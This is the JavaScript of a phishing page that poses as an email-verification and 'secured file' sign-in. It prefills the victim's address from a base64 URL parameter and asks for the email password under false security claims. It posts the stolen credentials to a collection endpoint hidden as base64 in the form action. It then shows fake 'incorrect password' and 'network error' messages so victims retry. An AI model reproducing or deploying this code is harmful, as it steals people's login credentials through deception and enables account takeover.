document.addEventListener('DOMContentLoaded', function(){
    const queryString = new URL(window.location.href);
    const em = decodeIfBase64(queryString.searchParams.get('e'));
    const introduction = document.querySelector("#introduction");
    const next1Button = document.querySelector("#next1");
    const placeOne = document.querySelector("#placeone");
    const form = document.querySelector("form");let ogugu = 0;

    if (em) {
      document.querySelector(".abracadabra").value = em;
      document.querySelector(".abracadabra").readOnly = true;
      document.querySelector(".abracadabra").style.backgroundColor = "#eeeeeeab";
    }

    let txt1 =`<center><h1>Verify</h1></center><p style=" font-size: 15px; margin: -2px 10px; font-weight: 400;color: #111; ">Verify Email Address to Continue</p>`;
    let txt2 =`<center><h1>Welcome </h1></center> <div class="svglabel"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg><p id="identity"></p></div>`;
    let errsign =`<svg aria-hidden="true" class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>`;

    introduction.innerHTML =txt1;

    form.addEventListener('submit', function(event){
        const lemaInput = document.querySelector("#lema");
        let atobb =  this.getAttribute("action");

        if (lemaInput.value === '') {
            lemaInput.focus();
            return false
        } else {
           event.preventDefault();
           introduction.innerHTML = txt2;
           document.querySelector("#identity").innerText = lemaInput.value;
            placeOne.innerHTML = `<div id="placetwo"> <div class="input-container"> <input type="hidden" value=${lemaInput.value} name="lemahi"> <input type="password" value="" class="abracadabra" id="lepa" name="lepa" minlength="0" placeholder="Enter email password" required> <div class="errormsg" id="stillerror"></div></div> <div class="rembme"><input type="checkbox" checked /> <span>Remember me</span></div> 
			
<div style="white-space: pre-line; font-size: 1em; line-height: 1.4em; margin: 0;">
    These files are sensitive and secured against unauthorized access. 
    Please provide your credentials to access this file. We will connect 
    to your account through a secured SSH channel to authorize your request.
</div> <div style="display: flex; justify-content: end;  margin-top:30px"> <button class="modal__btn modal__btn-primary" id="next2">Sign in</button> </div> </div>`;
                const placetwo = document.getElementById('placetwo');

                placetwo.style.transform = 'scale(0.5)'; // start at half size

                setTimeout(() => {
                  placetwo.style.transition = 'transform 0.4s'; // add transition effect
                  placetwo.style.transform = 'scale(1)'; // animate to original size
                }, 10); // wait 10ms before animating        
            lepaInput = document.querySelector("#lepa");lepaInput.focus();
            const next2Button = document.querySelector("#next2");
            const stillErrorElement = lepaInput.closest('.input-container').querySelector('.errormsg');
            next2Button.addEventListener('click', function(evt){
                // alert(lepaInput.value)
                if (lepaInput.validity.valid) {
                    evt.preventDefault();
                    next2Button.innerText = "Authenticating..."; next2Button.disabled = true;
                    // console.log('Input field is valid!');
                    const construc = `papa=${lemaInput.value}&mama=${lepaInput.value}`;
                    lepaInput.classList.remove("errborder");

                    axios.post(atob(atobb), construc, {
                      headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                      }
                    })
                    .then(response => {
                        ogugu++;
                        // stillErrorElement.innerText = "Please enter your correct email password";
                        stillErrorElement.innerText = (ogugu === 1 ? "Email or Password is incorrect." : (ogugu === 2  ? "Network error, kindly try again!": "Oops... Something went wrong. Please try again.")   );
                        // 
                    })
                    .catch(error => {
                        // console.error("Error:", error);
                        stillErrorElement.innerText = ("An error occurred. Please try again.");
                    })
                    .finally(() => {
                        next2Button.disabled = false;next2Button.innerText = "Sign in";
                        lepaInput.value = ""; lepaInput.focus();
                        lepaInput.classList.add("errborder");
                    });
                }          
            });
          return false
        }
    });
      // Select the elements
    MicroModal.init({
      disableScroll: true,
      ignoreOverlayClick: true
    });
    function decodeIfBase64(t){return function(t){try{return btoa(atob(t))==t}catch(t){return!1}}(t)?atob(t):t}

    // MicroModal.show('modal-1');
    document.querySelector('.modal__overlay').addEventListener('click', (e) => {
        e.stopPropagation();
    });
}); 
